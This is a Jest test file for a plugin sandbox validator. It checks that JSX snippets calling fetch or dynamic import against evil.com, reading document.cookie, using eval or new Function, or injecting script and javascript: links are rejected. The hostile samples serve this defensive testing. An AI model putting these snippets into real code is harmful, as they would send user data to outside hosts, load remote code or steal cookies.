import { validatePluginCode } from '@/utils/pluginSandbox'

describe('validatePluginCode', () => {
  it('should accept safe JSX code', () => {
    const code = `
      function Component() {
        const [count, setCount] = useState(0)
        return <div>{count}</div>
      }
    `
    expect(validatePluginCode(code)).toBeNull()
  })

  it('should reject code with fetch()', () => {
    const code = `
      function Component() {
        fetch('https://evil.com/steal')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('fetch')
  })

  it('should reject code with eval()', () => {
    const code = `
      function Component() {
        eval('alert(1)')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('eval')
  })

  it('should reject code with new Function()', () => {
    const code = `
      function Component() {
        const fn = new Function('return this()')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('new\\s+Function')
  })

  it('should reject code with import()', () => {
    const code = `
      function Component() {
        import('https://evil.com/module')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('import')
  })

  it('should reject code with document.cookie', () => {
    const code = `
      function Component() {
        const cookies = document.cookie
        return <div>{cookies}</div>
      }
    `
    expect(validatePluginCode(code)).toContain('document')
  })

  it('should reject code with localStorage', () => {
    const code = `
      function Component() {
        localStorage.setItem('key', 'value')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('localStorage')
  })

  it('should reject code with sessionStorage', () => {
    const code = `
      function Component() {
        sessionStorage.getItem('key')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('sessionStorage')
  })

  it('should reject code with navigator', () => {
    const code = `
      function Component() {
        const ua = navigator.userAgent
        return <div>{ua}</div>
      }
    `
    expect(validatePluginCode(code)).toContain('navigator')
  })

  it('should reject code with window.location', () => {
    const code = `
      function Component() {
        window.location.href = 'https://evil.com'
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('window')
  })

  it('should reject code with document.write', () => {
    const code = `
      function Component() {
        document.write('<script>alert(1)</script>')
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('document')
  })

  it('should reject code with javascript: protocol', () => {
    const code = `
      function Component() {
        return <a href="javascript:alert(1)">click</a>
      }
    `
    expect(validatePluginCode(code)).toContain('javascript')
  })

  it('should reject code with XMLHttpRequest', () => {
    const code = `
      function Component() {
        const xhr = new XMLHttpRequest()
        return <div>hi</div>
      }
    `
    expect(validatePluginCode(code)).toContain('XMLHttpRequest')
  })
})
